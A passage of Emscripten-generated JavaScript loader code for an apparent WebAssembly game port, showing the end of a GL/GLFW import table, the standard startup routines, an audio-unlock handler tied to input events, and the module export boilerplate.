            Id: _emscripten_glVertexAttrib1f,
            Hd: _emscripten_glVertexAttrib1fv,
            Gd: _emscripten_glVertexAttrib2f,
            Fd: _emscripten_glVertexAttrib2fv,
            Ed: _emscripten_glVertexAttrib3f,
            Dd: _emscripten_glVertexAttrib3fv,
            Cd: _emscripten_glVertexAttrib4f,
            Bd: _emscripten_glVertexAttrib4fv,
            Kb: _emscripten_glVertexAttribDivisor,
            hg: _emscripten_glVertexAttribDivisorANGLE,
            sb: _emscripten_glVertexAttribDivisorARB,
            vd: _emscripten_glVertexAttribDivisorEXT,
            tb: _emscripten_glVertexAttribDivisorNV,
            Gc: _emscripten_glVertexAttribI4i,
            Ec: _emscripten_glVertexAttribI4iv,
            Fc: _emscripten_glVertexAttribI4ui,
            Dc: _emscripten_glVertexAttribI4uiv,
            Jc: _emscripten_glVertexAttribIPointer,
            Ad: _emscripten_glVertexAttribPointer,
            zd: _emscripten_glViewport,
            Zb: _emscripten_glWaitSync,
            Sa: _emscripten_resize_heap,
            Ma: _emscripten_sample_gamepad_data,
            Aa: _emscripten_set_main_loop,
            R: _emscripten_sleep,
            cb: _environ_get,
            db: _environ_sizes_get,
            t: _exit,
            i: _fd_close,
            O: _fd_read,
            bb: _fd_seek,
            N: _fd_write,
            E: _glfwCreateWindow,
            C: _glfwDestroyWindow,
            Pa: _glfwGetCursorPos,
            la: _glfwGetFramebufferSize,
            Ba: _glfwGetInputMode,
            ma: _glfwGetMonitorName,
            s: _glfwGetMonitors,
            h: _glfwGetMouseButton,
            qa: _glfwGetVideoMode,
            ra: _glfwGetVideoModes,
            Ca: _glfwGetWindowSize,
            sa: _glfwInit,
            na: _glfwMakeContextCurrent,
            ya: _glfwPollEvents,
            Fa: _glfwSetCursorEnterCallback,
            L: _glfwSetCursorPos,
            Ga: _glfwSetCursorPosCallback,
            oa: _glfwSetErrorCallback,
            Ja: _glfwSetFramebufferSizeCallback,
            K: _glfwSetInputMode,
            Ia: _glfwSetKeyCallback,
            Ha: _glfwSetScrollCallback,
            Da: _glfwSetWindowFocusCallback,
            Ea: _glfwSetWindowIconifyCallback,
            G: _glfwSetWindowSize,
            ta: _glfwSwapBuffers,
            ua: _glfwSwapInterval,
            pa: _glfwTerminate,
            e: _glfwWindowHint,
            wa: _glfwWindowShouldClose,
            I: _regta3_js_file_status,
            u: _regta3_js_is_touch,
            Qa: _regta3_js_language_override,
            J: _regta3_js_load_progress,
            k: _regta3_js_persist_userfiles,
            Oa: _regta3_js_prefetch_asset,
            xa: _regta3_js_touch_state
        };
        function callMain(args = []) {
            var entryFunction = _main;
            args.unshift(thisProgram);
            var argc = args.length;
            var argv = stackAlloc((argc + 1) * 4);
            var argv_ptr = argv;
            for (var arg of args) {
                HEAPU32[argv_ptr >> 2] = stringToUTF8OnStack(arg);
                argv_ptr += 4
            }
            HEAPU32[argv_ptr >> 2] = 0;
            try {
                var ret = entryFunction(argc, argv);
                exitJS(ret, true);
                return ret
            } catch (e) {
                return handleException(e)
            }
        }
        function run(args = arguments_) {
            if (runDependencies > 0) {
                dependenciesFulfilled = run;
                return
            }
            preRun();
            if (runDependencies > 0) {
                dependenciesFulfilled = run;
                return
            }
            function doRun() {
                Module["calledRun"] = true;
                if (ABORT)
                    return;
                initRuntime();
                preMain();
                readyPromiseResolve?.(Module);
                Module["onRuntimeInitialized"]?.();
                var noInitialRun = Module["noInitialRun"] || false;
                if (!noInitialRun)
                    callMain(args);
                postRun()
            }
            if (Module["setStatus"]) {
                Module["setStatus"]("Running...");
                setTimeout(() => {
                    setTimeout(() => Module["setStatus"](""), 1);
                    doRun()
                }
                    , 1)
            } else {
                doRun()
            }
        }
        var wasmExports;
        wasmExports = await (createWasm());
        run();
        if (typeof AL !== "undefined") {
            Module["AL"] = AL;
            if (typeof globalThis !== "undefined") {
                globalThis.__regta3AL = AL
            }
            var regta3ResumeOpenAl = function () {
                try {
                    if (!AL || !AL.contexts)
                        return;
                    for (var id in AL.contexts) {
                        if (!Object.prototype.hasOwnProperty.call(AL.contexts, id))
                            continue;
                        var c = AL.contexts[id];
                        var ac = c && c.audioCtx;
                        if (ac && ac.state === "suspended") {
                            var p = ac.resume();
                            if (p && typeof p.then === "function") {
                                p.then(function () {
                                    try {
                                        var buf = ac.createBuffer(1, 1, ac.sampleRate || 22050);
                                        var src = ac.createBufferSource();
                                        src.buffer = buf;
                                        src.connect(ac.destination);
                                        src.start(0)
                                    } catch (e) { }
                                }).catch(function () { })
                            }
                        }
                    }
                    if (AL.currentCtx && AL.currentCtx.audioCtx && AL.currentCtx.audioCtx.state === "suspended") {
                        AL.currentCtx.audioCtx.resume()
                    }
                } catch (e) { }
            };
            Module.resumeRegta3Audio = regta3ResumeOpenAl;
            if (typeof globalThis !== "undefined") {
                globalThis.__regta3ResumeOpenAl = regta3ResumeOpenAl
            }
            ["keydown", "mousedown", "mouseup", "touchstart", "pointerdown"].forEach(function (ev) {
                document.addEventListener(ev, regta3ResumeOpenAl, true)
            })
        }
        if (typeof OPFS !== "undefined") {
            Module["OPFS"] = OPFS
        }
        if (runtimeInitialized) {
            moduleRtn = Module
        } else {
            moduleRtn = new Promise((resolve, reject) => {
                readyPromiseResolve = resolve;
                readyPromiseReject = reject
            }
            )
        }
        ; return moduleRtn
    }
}
)();
if (typeof exports === "object" && typeof module === "object") {
    module.exports = createRe3Module;
    module.exports.default = createRe3Module
} else if (typeof define === "function" && define["amd"])
    define([], () => createRe3Module);
